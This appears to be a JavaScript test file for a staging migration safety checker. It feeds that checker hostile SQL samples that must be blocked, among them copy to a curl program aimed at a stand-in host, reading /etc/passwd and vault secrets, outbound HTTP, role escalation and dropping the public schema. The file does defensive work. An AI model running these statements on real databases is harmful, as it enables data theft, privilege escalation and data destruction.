// 测试库迁移第二道检查（tools/staging_migrate_check.mjs，#95）：每条规则一个「会拦」和一个「不拦」；再用仓库里真实的迁移核对没有误伤
import fs from 'fs'; import path from 'path'; import { fileURLToPath } from 'url';
import { check, stripComments } from '../../tools/staging_migrate_check.mjs';
let pass = 0, fail = 0; const T = (n, ok, x) => { ok ? pass++ : fail++; if (!ok) console.log('FAIL ' + n + (x !== undefined ? ' ' + JSON.stringify(x) : '')) };
const DIR = process.argv[2] || path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const rules = sql => [...new Set(check(sql).map(x => x.rule))];
const blocks = (n, sql, rule) => T(`拦：${n}`, rules(sql).includes(rule), rules(sql));
const passes = (n, sql) => T(`不拦：${n}`, check(sql).length === 0, check(sql));

// —— 正常迁移（本仓库常见写法）
passes('加表 / 加列 / 索引 / 函数 / 行级安全 / 授权给 nbq_ 角色', `create table if not exists t (id uuid primary key, user_id uuid);
alter table t enable row level security; drop policy if exists p on t; create policy p on t to nbq_user using (user_id = nbq_uid());
create or replace function f() returns int language plpgsql security definer set search_path = public as $$ begin perform 1; return 1; end $$;
revoke execute on function f() from public, nbq_viewer; grant execute on function f() to nbq_user, nbq_service;
grant select, insert on t to nbq_service; insert into schema_migrations(version) values ('20261201_x') on conflict do nothing;`);
passes('注释里提到危险词不算', `-- 以后可能要 create role、copy ... to、auth.users、execute format\n/* drop schema x; grant nbq_admin to nbq_user; */ select 1;`);
passes('事件名 share_copy_link、函数名 nbq_execute_x 不算', `insert into e(n) values ('share_copy_link'); select nbq_execute_x();`);

// —— 每条规则
blocks('audit-allow', `-- audit-allow: 清理旧数据\ndelete from t;`, 'audit-allow');
blocks('建角色', `create role evil login password 'x';`, '角色');
blocks('改角色', `alter role nbq_user superuser;`, '角色');
blocks('切换身份', `set local role nbq_admin;`, '切换身份');
blocks('session authorization', `set session authorization postgres;`, '切换身份');
blocks('改所有者', `alter table t owner to evil;`, '所有者');
blocks('默认权限', `alter default privileges grant all on tables to public;`, '所有者');
blocks('copy 到程序', `copy t to program 'curl -d @- x.example';`, '读写文件');
blocks('读服务器文件', `select pg_read_file('/etc/passwd');`, '读写文件');
blocks('pg_net 外联', `select net.http_post('https://x.example', '{}');`, '外联');
blocks('dblink', `select * from dblink('host=x', 'select 1') as t(a int);`, '外联');
blocks('读登录用户表', `select phone from auth.users;`, '内部 schema');
blocks('读密钥库', `select * from vault.decrypted_secrets;`, '内部 schema');
blocks('函数体里藏着读 auth', `do $$ begin perform (select count(*) from auth.users); end $$;`, '内部 schema');
blocks('建扩展', `create extension if not exists http;`, '扩展与库级');
blocks('改库设置', `alter database postgres set log_statement = 'none';`, '扩展与库级');
blocks('删 schema', `drop schema public cascade;`, '扩展与库级');
blocks('动态 SQL：format', `do $$ begin execute format('drop table %I', 't'); end $$;`, '动态 SQL');
blocks('动态 SQL：拼字符串', `do $$ declare q text := 'x'; begin execute q || ';'; end $$;`, '动态 SQL');
blocks('动态 SQL：字面量', `do $$ begin execute 'select 1'; end $$;`, '动态 SQL');
blocks('关行级安全', `alter table users disable row level security;`, '关闭行级安全');
blocks('授权给 public', `grant select on users to public;`, '权限');
blocks('授权给 Supabase 角色', `grant select on users to anon, authenticated;`, '权限');
blocks('角色成员提权', `grant nbq_admin to nbq_user;`, '权限');
blocks('with grant option', `grant select on t to nbq_user with grant option;`, '权限');
T('行号指向命中的那一行', (check(`select 1;\n\nselect * from auth.users;`)[0] || {}).line === 3, check(`select 1;\n\nselect * from auth.users;`));
T('去注释后行数不变', stripComments(`a -- x\n/* y\nz */ b\n'--不是注释'`).split('\n').length === 4 && stripComments(`'--不是注释'`).includes('--不是注释'));

// —— 仓库里的真实迁移：只有建角色 / 切换身份的 admin_api 需要所有者手动执行，其余都不拦
const MIG = path.join(DIR, 'server/migrations'), files = fs.readdirSync(MIG).filter(f => /^2026\d{4}_[a-z0-9_]+\.sql$/.test(f));
const flagged = files.filter(f => check(fs.readFileSync(path.join(MIG, f), 'utf8')).length).sort();
T(`真实迁移（${files.length} 个）：只有 admin_api 会被拦`, JSON.stringify(flagged) === JSON.stringify(['20261105_admin_api.sql']), flagged);
T('admin_api 被拦的原因是角色 / 切换身份', rules(fs.readFileSync(path.join(MIG, '20261105_admin_api.sql'), 'utf8')).every(r => ['角色', '切换身份', '权限'].includes(r)), rules(fs.readFileSync(path.join(MIG, '20261105_admin_api.sql'), 'utf8')));

console.log(`staging_migrate_check: ${pass} passed, ${fail} failed`); process.exit(fail ? 1 : 0);
